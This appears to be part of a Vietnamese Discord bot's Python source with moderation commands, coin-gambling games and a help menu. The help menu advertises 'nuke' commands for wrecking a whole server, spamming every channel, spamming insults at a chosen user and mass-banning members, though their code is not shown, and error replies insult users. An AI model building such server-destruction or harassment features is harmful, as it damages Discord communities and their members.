@is_bot_owner()
async def mute_user(ctx, member: discord.Member, minutes: int = 10, *, reason: str = "Không có lý do"):
    """🔇 Tắt tiếng (Timeout) thành viên"""
    try:
        duration = timedelta(minutes=minutes)
        await member.timeout(duration, reason=reason)
        embed = discord.Embed(
            title="🔇 ĐÃ TẮT TIẾNG THÀNH VIÊN",
            description=f"👤 **Người bị mute:** {member.mention}\n⏱️ **Thời gian:** {minutes} phút\n📌 **Lý do:** {reason}",
            color=0xFF9900
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@mute_user.error
async def mute_user_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="unmute")
@is_bot_owner()
async def unmute_user(ctx, member: discord.Member):
    """🔊 Bỏ tắt tiếng (Un-timeout) thành viên"""
    try:
        await member.timeout(None)
        embed = discord.Embed(
            title="🔊 ĐÃ BỎ TẮT TIẾNG",
            description=f"👤 **Thành viên:** {member.mention} đã có thể chat lại.",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@unmute_user.error
async def unmute_user_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="move")
@is_bot_owner()
async def move_member(ctx, member: discord.Member, channel: discord.VoiceChannel):
    """🚪 Di chuyển thành viên sang voice channel khác"""
    try:
        await member.move_to(channel)
        embed = discord.Embed(
            title="🚪 ĐÃ DI CHUYỂN THÀNH VIÊN",
            description=f"👤 {member.mention} đã được chuyển vào kênh {channel.mention}",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@move_member.error
async def move_member_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="settopic")
@is_bot_owner()
async def set_topic(ctx, channel: discord.TextChannel, *, topic: str):
    """📝 Đặt chủ đề cho kênh văn bản"""
    try:
        await channel.edit(topic=topic)
        embed = discord.Embed(
            title="📝 ĐÃ ĐẶT CHỦ ĐỀ KÊNH",
            description=f"📌 **Kênh:** {channel.mention}\n**Chủ đề:** {topic}",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@set_topic.error
async def set_topic_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="setnsfw")
@is_bot_owner()
async def set_nsfw(ctx, channel: discord.TextChannel, nsfw: bool):
    """🔞 Bật/Tắt chế độ NSFW cho kênh"""
    try:
        await channel.edit(nsfw=nsfw)
        status = "Bật" if nsfw else "Tắt"
        embed = discord.Embed(
            title="🔞 ĐÃ THAY ĐỔI CHẾ ĐỘ NSFW",
            description=f"📌 **Kênh:** {channel.mention}\n**Trạng thái:** {status}",
            color=0x00FF00 if nsfw else 0xFF9900
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@set_nsfw.error
async def set_nsfw_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="createcategory")
@is_bot_owner()
async def create_category(ctx, *, name: str):
    """📁 Tạo Danh mục (Category) mới"""
    try:
        category = await ctx.guild.create_category(name)
        embed = discord.Embed(
            title="📁 ĐÃ TẠO DANH MỤC MỚI",
            description=f"✅ Danh mục **{category.name}** đã được tạo thành công.",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@create_category.error
async def create_category_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== NÂNG CẤP LỆNH CÀI ĐẶT KÊNH (TẠO TAG KÊNH CHUẨN XÁC) ====================
@bot.command(name="setwelcome")
@is_bot_owner()
async def set_welcome_channel(ctx, channel: discord.TextChannel = None):
    """🎉 Đặt kênh gửi tin nhắn chào mừng thành viên mới"""
    if channel is None:
        if ctx.message.mentions:
            await ctx.send("❌ Cú pháp sai! Hãy tag đúng kênh văn bản `#channel` chứ không tag người dùng!")
            return
        channel = ctx.channel

    WELCOME_CHANNELS[str(ctx.guild.id)] = channel.id
    save_config()
    
    embed = discord.Embed(
        title="🎉 THIẾT LẬP KÊNH CHÀO MỪNG",
        description=f"✅ Đã thiết lập kênh chào mừng thành công tại {channel.mention}!",
        color=0x00FF00
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@set_welcome_channel.error
async def set_welcome_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="setgoodbye")
@is_bot_owner()
async def set_goodbye_channel(ctx, channel: discord.TextChannel = None):
    """😢 Đặt kênh gửi tin nhắn tạm biệt thành viên rời server"""
    if channel is None:
        if ctx.message.mentions:
            await ctx.send("❌ Cú pháp sai! Hãy tag đúng kênh văn bản `#channel` chứ không tag người dùng!")
            return
        channel = ctx.channel

    GOODBYE_CHANNELS[str(ctx.guild.id)] = channel.id
    save_config()

    embed = discord.Embed(
        title="😢 THIẾT LẬP KÊNH TẠM BIỆT",
        description=f"✅ Đã thiết lập kênh tạm biệt thành công tại {channel.mention}!",
        color=0xFF0000
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@set_goodbye_channel.error
async def set_goodbye_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="setlevelchannel")
@is_bot_owner()
async def set_level_channel(ctx, channel: discord.TextChannel = None):
    """📈 Đặt kênh riêng để thông báo khi thành viên thăng cấp (Level up)"""
    if channel is None:
        if ctx.message.mentions:
            await ctx.send("❌ Cú pháp sai! Hãy tag đúng kênh văn bản `#channel` chứ không tag người dùng!")
            return
        channel = ctx.channel

    SERVER_LEVEL_CHANNELS[str(ctx.guild.id)] = channel.id
    save_config()

    embed = discord.Embed(
        title="📈 THIẾT LẬP KÊNH LEVEL UP",
        description=f"✅ Đã thiết lập kênh thông báo Level Up tại {channel.mention}!",
        color=0xFFD700
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@set_level_channel.error
async def set_level_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="channelslog")
@is_bot_owner()
async def set_log_channel(ctx, channel: discord.TextChannel = None):
    """📋 Đặt kênh ghi lại nhật ký nhật trình (Logs) sự kiện của server"""
    if channel is None:
        if ctx.message.mentions:
            await ctx.send("❌ Cú pháp sai! Hãy tag đúng kênh văn bản `#channel` chứ không tag người dùng!")
            return
        channel = ctx.channel

    SERVER_LOG_CHANNELS[str(ctx.guild.id)] = channel.id
    save_config()

    embed = discord.Embed(
        title="📋 THIẾT LẬP KÊNH LOG SỰ KIỆN",
        description=f"✅ Đã đặt kênh Log sự kiện tại {channel.mention} thành công!",
        color=0x00CCFF
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@set_log_channel.error
async def set_log_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH KINH TẾ (COINS & GAME) ====================
def get_user_coins(user_id):
    return user_coins.get(str(user_id), 0)

def add_coins(user_id, amount):
    uid = str(user_id)
    user_coins[uid] = user_coins.get(uid, 0) + amount
    save_coins(user_coins)

def subtract_coins(user_id, amount):
    uid = str(user_id)
    cur = user_coins.get(uid, 0)
    if cur < amount:
        return False
    user_coins[uid] = cur - amount
    save_coins(user_coins)
    return True

def get_win_msg():
    msgs = [
        "🎉 Bạn quá may mắn!",
        "🔥 Đỉnh cao chiến thần!",
        "💎 Thần tài gõ cửa!",
        "🚀 Tiền vào như nước!",
        "🌟 Thắng lớn rồi sếp ơi!"
    ]
    return random.choice(msgs)

def get_lose_msg():
    msgs = [
        "💀 Đen thôi đỏ quên đi!",
        "😭 Thua keo này ta bày keo khác!",
        "💸 Bốc hơi số tiền cược...",
        "📉 May mắn lần sau nhé!",
        "⚠️ Xịt cmnr!"
    ]
    return random.choice(msgs)

@bot.command(name="balance", aliases=["bal", "money", "coin"])
async def check_balance(ctx, member: discord.Member = None):
    """💰 Xem số coin hiện có của bản thân hoặc người khác"""
    target = member or ctx.author
    coins = get_user_coins(target.id)
    embed = discord.Embed(
        title="💰 TÀI THẢN CỦA BẠN",
        description=f"👤 **Thành viên:** {target.mention}\n💵 **Số coin hiện có:** `{coins:,}` coin",
        color=0xFFD700
    )
    embed.set_thumbnail(url=target.display_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name="daily")
async def daily_reward(ctx):
    """🎁 Nhận quà coin miễn phí hàng ngày"""
    reward = random.randint(500, 2000)
    add_coins(ctx.author.id, reward)
    embed = discord.Embed(
        title="🎁 PHẦN QUÀ HÀNG NGÀY",
        description=f"🎉 Bạn đã nhận thành công **+{reward:,} coin** điểm danh hôm nay!",
        color=0x00FF00
    )
    await ctx.send(embed=embed)

@bot.command(name="work")
async def work_command(ctx):
    """🛠️ Làm việc chăm chỉ kiếm coin"""
    jobs = [
        "Lập trình Bot Discord", "Rửa bát thuê", "Đi bán vé số",
        "Chạy Grab xe ôm", "Giao hàng Shopee", "Bán trà đá vỉa hè"
    ]
    job = random.choice(jobs)
    earned = random.randint(200, 800)
    add_coins(ctx.author.id, earned)
    embed = discord.Embed(
        title="🛠️ LÀM VIỆC CHĂM CHỈ",
        description=f"💼 Bạn đã làm công việc **{job}** và thu về **+{earned:,} coin**!",
        color=0x00CCFF
    )
    await ctx.send(embed=embed)

@bot.command(name="give", aliases=["pay"])
async def give_coins(ctx, member: discord.Member, amount: int):
    """💸 Chuyển coin cho người chơi khác"""
    if amount <= 0:
        await ctx.send("❌ Số coin chuyển phải lớn hơn 0!")
        return
    if member.id == ctx.author.id:
        await ctx.send("❌ Bạn không thể tự chuyển coin cho chính mình!")
        return
    if not subtract_coins(ctx.author.id, amount):
        await ctx.send("❌ Bạn không có đủ số coin để chuyển!")
        return
    add_coins(member.id, amount)
    embed = discord.Embed(
        title="💸 GIAO DỊCH CHUYỂN COIN",
        description=f"✅ {ctx.author.mention} đã chuyển thành công **{amount:,} coin** cho {member.mention}!",
        color=0x00FF00
    )
    await ctx.send(embed=embed)

@bot.command(name="coinflip", aliases=["cf"])
async def coinflip(ctx, bet: int, choice: str):
    """🪙 Trò chơi Tung Đồng Xu (x2 coin)"""
    if bet <= 0:
        await ctx.send("❌ Số coin cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ `{bet:,}` coin để cược!")
        return
    choice = choice.lower()
    if choice not in ["h", "t", "ngua", "up"]:
        add_coins(ctx.author.id, bet)
        await ctx.send("❌ Lựa chọn không hợp lệ! Dùng `h` (Ngửa) hoặc `t` (Úp).")
        return

    result = random.choice(["h", "t"])
    res_str = "Ngửa (Head)" if result == "h" else "Úp (Tail)"
    user_choice_str = "Ngửa (Head)" if choice in ["h", "ngua"] else "Úp (Tail)"

    if (choice in ["h", "ngua"] and result == "h") or (choice in ["t", "up"] and result == "t"):
        win = bet * 2
        add_coins(ctx.author.id, win)
        await ctx.send(f"🪙 Kết quả: **{res_str}** | Bạn chọn: **{user_choice_str}**\n🎉 **BẠN THẮNG!** {get_win_msg()} Nhận **+{win:,} coin**!")
    else:
        await ctx.send(f"🪙 Kết quả: **{res_str}** | Bạn chọn: **{user_choice_str}**\n💀 **BẠN THUA!** {get_lose_msg()} Mất **-{bet:,} coin**.")

@bot.command(name="slots")
async def slots(ctx, bet: int):
    """🎰 Trò chơi Máy Đánh Bạc Slots"""
    if bet <= 0:
        await ctx.send("❌ Số coin cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ `{bet:,}` coin!")
        return

    emojis = ["🍎", "🍋", "🍒", "🍇", "💎", "7️⃣"]
    s1, s2, s3 = random.choice(emojis), random.choice(emojis), random.choice(emojis)

    msg = f"🎰 **SLOTS MACHINE** 🎰\n| {s1} | {s2} | {s3} |\n"
    if s1 == s2 == s3:
        win = bet * 5
        add_coins(ctx.author.id, win)
        await ctx.send(msg + f"🔥 **JACKPOT 3/3!** Bạn thắng gấp 5 lần: **+{win:,} coin**!")
    elif s1 == s2 or s2 == s3 or s1 == s3:
        win = bet * 2
        add_coins(ctx.author.id, win)
        await ctx.send(msg + f"🎉 **TRÚNG 2/3!** Bạn thắng **+{win:,} coin**!")
    else:
        await ctx.send(msg + f"💀 **THUA RỒI!** Bạn mất **-{bet:,} coin**.")

@bot.command(name="rps")
async def rps(ctx, bet: int, choice: str):
    """✂️ Kéo búa bao (x2 coin)"""
    if bet <= 0:
        await ctx.send("❌ Số coin cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ `{bet:,}` coin!")
        return
    options = {"r": "🪨 Búa", "p": "📄 Bao", "s": "✂️ Kéo"}
    user_c = choice.lower()
    if user_c not in options:
        add_coins(ctx.author.id, bet)
        await ctx.send("❌ Hãy chọn `r` (Búa), `p` (Bao), hoặc `s` (Kéo)!")
        return
    bot_c = random.choice(["r", "p", "s"])
    msg = f"Bạn chọn **{options[user_c]}** 🆚 Bot chọn **{options[bot_c]}**\n"
    if user_c == bot_c:
        add_coins(ctx.author.id, bet)
        await ctx.send(msg + "🤝 **HÒA RỒI!** Đã hoàn lại tiền cược.")
    elif (user_c == "r" and bot_c == "s") or (user_c == "p" and bot_c == "r") or (user_c == "s" and bot_c == "p"):
        win = bet * 2
        add_coins(ctx.author.id, win)
        await ctx.send(msg + f"🎉 **BẠN THẮNG!** {get_win_msg()} Nhận **+{win:,} coin**!")
    else:
        await ctx.send(msg + f"💀 **BẠN THUA!** {get_lose_msg()} Mất **-{bet:,} coin**.")

# ==================== MENU HELP SIÊU ĐẸP & SANG TRỌNG ====================
HELP_CATEGORIES = {
    "👑 Lệnh Độc Quyền Owner": [
        "`nuked nuke` - Phá hoại toàn bộ Server (Cần xác nhận)",
        "`nuked spam` - Bắt đầu spam tất cả kênh",
        "`nuked stopspam` - Dừng hệ thống spam",
        "`nuked spamroast @user <số>` - Spam chửi thành viên chỉ định",
        "`nuked kick @user [lý do]` - Kick thành viên ra khỏi server",
        "`nuked ban @user [lý do]` - Cấm thành viên khỏi server",
        "`nuked unban <id>` - Gỡ ban cho thành viên qua ID",
        "`nuked massban @user1 @user2...` - Cấm nhiều người cùng lúc",
        "`nuked createchannel <tên>` - Tạo kênh văn bản mới",
        "`nuked deletechannel [#channel]` - Xóa kênh được chọn",
        "`nuked purge all` - Xóa sạch toàn bộ tin nhắn server",
        "`nuked lockchannel [#channel]` - Khóa kênh văn bản",
        "`nuked unlockchannel [#channel]` - Mở khóa kênh văn bản",
        "`nuked mute @user [phút]` - Tắt tiếng thành viên",
        "`nuked unmute @user` - Bỏ tắt tiếng thành viên",
        "`nuked role @user <tên role>` - Gán role cho thành viên",
        "`nuked removerole @user <tên role>` - Xóa role khỏi thành viên",
        "`nuked setwelcome #channel` - Đặt kênh chào mừng",
        "`nuked setgoodbye #channel` - Đặt kênh tạm biệt",
        "`nuked setlevelchannel #channel` - Đặt kênh Level up",
        "`nuked channelslog #channel` - Đặt kênh lưu log sự kiện",
    ],
    "💰 Kinh Tế & Giải Trí": [
        "`nuked balance [@user]` - Xem số dư coin cá nhân/người khác",
        "`nuked daily` - Điểm danh nhận quà coin mỗi ngày",
        "`nuked work` - Làm việc chăm chỉ kiếm coin",
        "`nuked give @user <số>` - Chuyển coin cho người khác",
        "`nuked coinflip <số> <h/t>` - Trò chơi tung đồng xu x2",
        "`nuked slots <số>` - Máy quay hũ Slots thưởng lớn",
        "`nuked rps <số> <r/p/s>` - Trò chơi Oẳn tù tì Kéo Búa Bao",
    ],
    "📊 Thông Tin & Stats": [
        "`nuked stats` - Xem thông số hệ thống và Server",
        "`nuked help` - Mở Menu bảng hướng dẫn trải nghiệm đỉnh cao",
    ]
}

HELP_CATEGORY_DESCRIPTIONS = {
    "👑 Lệnh Độc Quyền Owner": "Bộ công cụ tối cao dành riêng cho Boss Bảo và các Owners quản trị hệ thống.",
    "💰 Kinh Tế & Giải Trí": "Hệ thống mini-game, cá cược, kiếm coin và chuyển tiền phong phú.",
    "📊 Thông Tin & Stats": "Xem thống kê chi tiết của Server và bot."
}

class HelpSelect(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(
                label="Trang Chủ",
                value="Home",
                description="Quay lại giao diện chính của bảng trợ giúp",
                emoji="🏠"
            )
        ]
        for cat in HELP_CATEGORIES.keys():
            emoji_icon = cat.split()[0]
            label_text = cat.replace(emoji_icon, "").strip()
            options.append(
                discord.SelectOption(
                    label=label_text,
                    value=cat,
                    description=HELP_CATEGORY_DESCRIPTIONS.get(cat, "")[:50],
                    emoji=emoji_icon
                )
            )
        super().__init__(placeholder="🔍 Chọn danh mục lệnh bạn muốn xem...", min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        selected = self.values[0]
        if selected == "Home":
            embed = discord.Embed(
                title="✨ BẢNG ĐIỀU KHIỂN QUẢN TRỊ TỐI CAO ✨",
                description=(
                    "Chào mừng bạn đến với hệ thống Bot đẳng cấp hàng đầu!\n"
                    "Hãy chọn danh mục ở Menu thả xuống bên dưới để khám phá danh sách các lệnh.\n\n"
                    "📌 **Prefix mặc định:** `nuked`\n"
                    "👑 **Sở hữu bởi:** Boss Bảo & Đồng minh Tối Cao"
                ),
                color=0xFF69B4
            )
            embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
            embed.set_footer(text="Hệ thống quản trị đỉnh cao • Boss Bảo On Top", icon_url=interaction.client.user.display_avatar.url)
            await interaction.response.edit_message(embed=embed, view=self.view)
        else:
            cmds = HELP_CATEGORIES.get(selected, [])
            desc = HELP_CATEGORY_DESCRIPTIONS.get(selected, "")
            cmd_text = "\n".join(cmds) if cmds else "Chưa có lệnh nào trong mục này."
            
            embed = discord.Embed(
                title=f"📋 Danh Mục: {selected}",
                description=f"💡 **Mô tả:** {desc}\n\n**Danh sách lệnh:**\n{cmd_text}",
                color=0x00FFCC
            )
            embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
            embed.set_footer(text="Hệ thống quản trị đỉnh cao • Boss Bảo On Top", icon_url=interaction.client.user.display_avatar.url)
            await interaction.response.edit_message(embed=embed, view=self.view)

class HelpView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=180)
        self.add_item(HelpSelect())

@bot.command(name="help")
async def help_command(ctx):
    """✨ Mở Menu bảng hướng dẫn trải nghiệm đỉnh cao"""
    embed = discord.Embed(
        title="✨ BẢNG ĐIỀU KHIỂN QUẢN TRỊ TỐI CAO ✨",
        description=(
            "Chào mừng bạn đến với hệ thống Bot đẳng cấp hàng đầu!\n"
            "Hãy chọn danh mục ở Menu thả xuống bên dưới để khám phá danh sách các lệnh.\n\n"
            "📌 **Prefix mặc định:** `nuked`\n"
            "👑 **Sở hữu bởi:** Boss Bảo & Đồng minh Tối Cao"
        ),
        color=0xFF69B4
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    embed.set_footer(text="Hệ thống quản trị đỉnh cao • Boss Bảo On Top", icon_url=bot.user.display_avatar.url)
    view = HelpView()
    await ctx.send(embed=embed, view=view)

@bot.command(name="stats")
async def server_stats(ctx):
    """📊 Xem thông số và thống kê server"""
    guild = ctx.guild
    embed = discord.Embed(
        title=f"📊 THỐNG KÊ SERVER {guild.name.upper()}",
        color=0x00FF00
    )
    embed.add_field(name="🆔 Server ID", value=f"`{guild.id}`", inline=True)
    embed.add_field(name="👑 Chủ Server", value=guild.owner.mention if guild.owner else "Không rõ", inline=True)
    embed.add_field(name="👥 Số thành viên", value=f"`{guild.member_count}` người", inline=True)
    embed.add_field(name="💬 Kênh Văn Bản", value=f"`{len(guild.text_channels)}` kênh", inline=True)
    embed.add_field(name="🔊 Kênh Thoại", value=f"`{len(guild.voice_channels)}` kênh", inline=True)
    embed.add_field(name="🎭 Số lượng Role", value=f"`{len(guild.roles)}` roles", inline=True)
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
    await ctx.send(embed=embed)

# ==================== SỰ KIỆN PHÁT HIỆN TAG OWNER ====================
@bot.event
async def on_message(message):
    if message.author.bot:
        return

    # Xử lý lệnh trước
    await bot.process_commands(message)

    # Kiểm tra nếu tin nhắn có tag bất kỳ owner nào
    if message.mentions:
        for user in message.mentions:
            if user.id in BOT_OWNERS:
                await message.reply("oi tag gì thế thích Boss Bảo tui à s k ns?")
                break

# ==================== SỰ KIỆN WELCOME & GOODBYE ====================
@bot.event
async def on_member_join(member):
    guild_id = str(member.guild.id)
    if guild_id in WELCOME_CHANNELS:
        ch_id = WELCOME_CHANNELS[guild_id]
        channel = member.guild.get_channel(ch_id)
        if channel:
            embed = discord.Embed(
                title="🎉 **CHÀO MỪNG THÀNH VIÊN MỚI** 🎉",
                description=f"Chào mừng {member.mention} đã tham gia vào **{member.guild.name}**! Chúc bạn có những phút giây vui vẻ!",
                color=0x00FF00
            )
            embed.set_thumbnail(url=member.display_avatar.url)
            try:
                await channel.send(embed=embed)
            except:
                pass

@bot.event
async def on_member_remove(member):
    guild_id = str(member.guild.id)
    if guild_id in GOODBYE_CHANNELS:
        ch_id = GOODBYE_CHANNELS[guild_id]
        channel = member.guild.get_channel(ch_id)
        if channel:
            embed = discord.Embed(
                title="😢 **TẠM BIỆT THÀNH VIÊN** 😢",
                description=f"Tạm biệt {member.mention}, chúc bạn luôn may mắn và thành công trên con đường sắp tới!",
                color=0xFF0000
            )
            embed.set_thumbnail(url=member.display_avatar.url)
            try:
                await channel.send(embed=embed)
            except:
                pass

# ==================== SỰ KIỆN ON_READY ====================
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    print("✨ Bot đã khởi động thành công và sẵn sàng hoạt động!")

# ==================== CHẠY BOT ====================
if __name__ == "__main__":
    keep_alive()
    if DISCORD_TOKEN:
        bot.run(DISCORD_TOKEN)
    else:
        print("❌ Lỗi: Chưa cấu hình TOKEN trong Environment Variables!")
